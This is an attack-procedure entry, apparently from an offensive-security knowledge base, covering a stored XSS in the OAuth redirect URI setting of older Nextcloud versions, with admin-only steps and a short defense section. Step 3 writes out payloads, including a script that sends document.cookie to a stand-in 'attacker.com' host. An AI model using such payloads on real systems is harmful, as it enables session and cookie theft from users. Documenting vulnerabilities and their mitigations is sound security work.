---
id: proc-nextcloud-xss-injection-oauth
tags:
  - xss
  - stored-xss
  - nextcloud
  - oauth
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:35.545Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Malicious JavaScript into Nextcloud OAuth Redirect URI

## Summary

This procedure exploits a stored XSS vulnerability in Nextcloud's OAuth redirect URI field by injecting malicious JavaScript as an authenticated admin. The lack of proper input sanitization allows the payload to be stored persistently, enabling execution when the URI is later accessed or displayed to users.

## Description

In Nextcloud versions prior to patches for this issue (reported August 2017), the OAuth configuration interface does not escape or validate user input in the redirect URI field. An admin can submit a JavaScript URI scheme (e.g., `javascript:alert('XSS')`) or embedded script tags, which get stored in the backend. When another user or the admin accesses the OAuth settings or initiates a redirect, the payload executes in the browser context, potentially stealing cookies, session tokens, or performing other client-side actions. This is limited to admin injectors but affects all users viewing the field. CVSS score: 3.4 (low) due to privilege requirement.

## Requirements

1. Admin credentials for the Nextcloud instance
2. Web browser with developer tools for payload testing
3. Direct access to the Nextcloud web interface (HTTPS typically)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and escaping for all configuration fields (e.g., whitelist URI schemes)
- Use Content Security Policy (CSP) to block inline JavaScript execution
- Monitor admin actions on OAuth settings via audit logs; detect anomalous URI patterns

## Objectives

1. Persist malicious JavaScript in the OAuth redirect URI configuration
2. Set up for subsequent execution in victim browsers
3. Demonstrate potential for client-side data exfiltration

## Instructions

### Step 1: Authenticate as Admin

**Context**: Gain access to the administrative interface to reach OAuth settings.

Log in to Nextcloud using admin credentials via the web login page.

**Expected Output**: Dashboard loads with admin menu options.

### Step 2: Navigate to OAuth Settings

**Context**: Locate the vulnerable configuration field.

From the admin settings, go to "Apps" > Enable OAuth if needed, then access "Security" or "OAuth" configuration section where the redirect URI is editable.

**Expected Output**: Form field for "Redirect URI" appears.

### Step 3: Inject Payload

**Context**: Submit unsanitized JavaScript to store the XSS.

Enter a payload such as `javascript:alert(document.domain + ' - XSS Triggered')` or `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>` into the redirect URI field and save the configuration.

**Expected Output**: Configuration saves without error; payload is reflected in the stored value when viewed.

### Step 4: Verify Storage

**Context**: Confirm the payload is persisted without sanitization.

Refresh the settings page or view the OAuth config; the field should display the injected script verbatim.

**Expected Output**: Unsanitized payload visible in the UI.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
- nextcloud
- oauth
